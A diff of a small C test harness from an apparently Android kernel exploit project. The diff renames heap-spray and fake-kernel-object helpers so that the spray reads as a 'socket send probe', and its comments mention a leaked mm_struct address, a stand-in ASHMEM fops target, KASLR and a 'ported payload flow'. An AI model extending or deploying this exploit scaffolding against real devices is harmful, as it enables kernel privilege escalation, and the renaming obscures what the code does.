@@ -1,13 +1,13 @@
-/* Standalone test for build_fops_install_object() + spray_fops_install_object(),
+/* Standalone test for build_fops_install_object() + probe_skb_send(),
  * using a real leaked mm_struct address from kernelsnitch but a FAKE
  * (userspace, harmless) address in place of the real ASHMEM_MISC_FOPS
- * kernel target -- this validates the spray mechanics (does sendmsg
+ * kernel target -- this validates the socket send (does sendmsg
  * succeed, does nothing crash) without ever needing KASLR to succeed
  * first. Test harness only, not part of the ported payload flow. */
 #include <stdio.h>
 
-#include "fops_install.h"
-#include "fops_spray.h"
+#include "04_fake_kernel_objects.h"
+#include "skb_send_probe.h"
 #include "mm_leak.h"
 
 int main(void) {
@@ -24,7 +24,7 @@ int main(void) {
                              0xdeadbeefULL, 0xcafebabeULL);
   printf("page_base=%016llx\n", (unsigned long long)page_base);
 
-  int ok = spray_fops_install_object(scratch, sizeof(scratch));
-  printf("spray delivered=%d\n", ok);
+  int ok = probe_skb_send(scratch, sizeof(scratch));
+  printf("skb send delivered=%d\n", ok);
   return ok ? 0 : 1;
 }
